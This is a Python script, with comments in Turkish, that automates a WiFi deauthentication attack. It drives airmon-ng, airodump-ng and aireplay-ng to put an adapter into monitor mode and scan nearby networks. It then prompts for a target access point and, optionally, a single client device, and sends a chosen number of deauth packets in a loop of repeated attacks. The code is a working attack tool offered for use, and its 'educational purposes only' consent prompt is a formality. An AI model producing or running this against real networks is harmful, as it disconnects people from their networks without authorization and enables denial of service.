import os
import subprocess
import time
import sys

# Kullanıcıdan onay alma
def get_user_consent():
    print("[!] WARNING & DISCLAIMER")
    print("This tool is for educational purposes only.")
    consent = input("Do you accept the terms and conditions? (yes/no): ").strip().lower()
    if consent != "yes":
        print("[-] Consent not given. Exiting...")
        sys.exit()

# WiFi adaptör kontrolü
def check_wifi_adapter():
    result = subprocess.run(["sudo", "iwconfig"], capture_output=True, text=True)
    if "wlan0" not in result.stdout:
        print("[-] No wireless adapter found!")
        sys.exit()

# Monitor modu başlatma
def start_monitor_mode():
    print("[*] Starting monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "start", "wlan0"])
    time.sleep(3)

# Ağları tarama
def scan_networks():
    print("[*] Scanning networks... Press Ctrl+C to stop.")
    subprocess.run(["sudo", "airodump-ng", "wlan0mon"])

# Kullanıcıdan hedef ağ seçimi
def select_target_network():
    target_mac = input("[?] Enter the target network MAC address: ").strip()
    return target_mac

# Kullanıcıdan kanal bilgisi alma
def get_target_channel():
    channel = input("[?] Enter the channel of the target network: ").strip()
    return channel

# Ağa bağlı cihazları tarama
def scan_connected_devices(target_mac, channel):
    print(f"[*] Scanning devices in {target_mac} on channel {channel}...")
    subprocess.run(["sudo", "airodump-ng", "--bssid", target_mac, "--channel", channel, "wlan0mon"])

# Kullanıcıdan hedef cihaz seçimi alma
def select_target_device(target_mac, channel):
    choice = input("[?] Do you want to target a specific device? (yes/no): ").strip().lower()
    if choice == "yes":
        scan_connected_devices(target_mac, channel)
        client_mac = input("[?] Enter the device MAC address: ").strip()
        return client_mac
    return None

# Paket sayısını belirleme
def select_deauth_packet_count():
    packet_count = input("[?] Enter the number of deauth packets: ").strip()
    if not packet_count.isdigit():
        print("[-] Invalid input, defaulting to 5 packets.")
        return "5"
    return packet_count

import subprocess

import subprocess

# Deauthentication saldırısını başlatma
def start_deauth_attack(target_mac, client_mac, packet_count):
    # Paket sayısını doğrulama
    if not str(packet_count).isdigit():  
        print("[-] Invalid packet count, defaulting to 10.")
        packet_count = "10"
    else:
        packet_count = str(packet_count)  # Aireplay-ng string format bekliyor
    
    print(f"[*] Running attack with {packet_count} packets...")

    # Wi-Fi arayüzünü belirleme
    interface = "wlan0mon"

    # Hedeflenen cihaza saldırı mı, yoksa SSID’ye genel saldırı mı?
    if client_mac:
        print(f"[*] Attacking {client_mac} in {target_mac} network...")
        command = ["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-c", client_mac, "-i", interface, "--ignore-negative-one"]
    else:
        print(f"[*] Attacking entire {target_mac} network (SSID focus)...")
        command = ["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-i", interface, "--ignore-negative-one"]

    # Saldırıyı başlat ve çıktıyı al
    result = subprocess.run(command, capture_output=True, text=True)

    # Çıktı ve hata kontrolü
    if result.returncode == 0:
        print("[+] Attack successfully executed!")
    else:
        print("[-] Error executing aireplay-ng! Check permissions or dependencies.")

    print("[DEBUG] Command Output:", result.stdout)  # 🛠 Tam komut çıktısını gösteriyoruz!
    print("[DEBUG] Command Error:", result.stderr)  # 🛠 Eğer hata varsa, bunun nedenini görebileceğiz!

# Ana akış
def main():
    get_user_consent()
    check_wifi_adapter()
    start_monitor_mode()
    scan_networks()

    target_mac = select_target_network()
    channel = get_target_channel()
    client_mac = select_target_device(target_mac, channel)

    while True:
        packet_count = select_deauth_packet_count()
        start_deauth_attack(target_mac, client_mac, packet_count)

        repeat = input("[?] Would you like to perform another attack? (yes/no): ").strip().lower()
        if repeat != "yes":
            print("[+] Exiting...")
            sys.exit()

if __name__ == "__main__":
    main()